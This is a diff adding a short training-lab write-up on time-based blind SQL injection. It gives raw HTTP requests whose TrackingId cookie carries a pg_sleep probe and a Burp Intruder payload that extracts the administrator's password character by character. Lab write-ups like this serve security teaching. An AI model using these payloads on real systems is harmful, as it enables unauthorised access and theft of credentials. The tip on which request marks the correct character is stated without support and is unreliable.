@@ -1,0 +1,34 @@
+Blind SQL injection with time delays
+
+Standard Blind SQL injection, based on the time it takes for the app to respond.
+Request to test SQL injection:
+
+GET / HTTP/1.1
+Host: acde1f161ede0af58130118500b100a9.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acde1f161ede0af58130118500b100a9.web-security-academy.net/
+Cookie: TrackingId=x'||pg_sleep(10)--; session=wiTuXYXSTYkXd9gWsC97OKPIVPLQir9o
+Upgrade-Insecure-Requests: 1
+
+
+Intruder Requests used:
+
+GET / HTTP/1.1
+Host: ac361fce1f094c4a80a7fe09009300a9.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac361fce1f094c4a80a7fe09009300a9.web-security-academy.net/
+Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=I82BajAgJnmcw1miJoXEQ7wy1205hNd1
+Upgrade-Insecure-Requests: 1
+
+
+In intruder, if you're experiencing a pause after a request, the NEXT one is the character part of the password, as it triggered the 10 second response time.
+
+With your password, log in and claim victory.
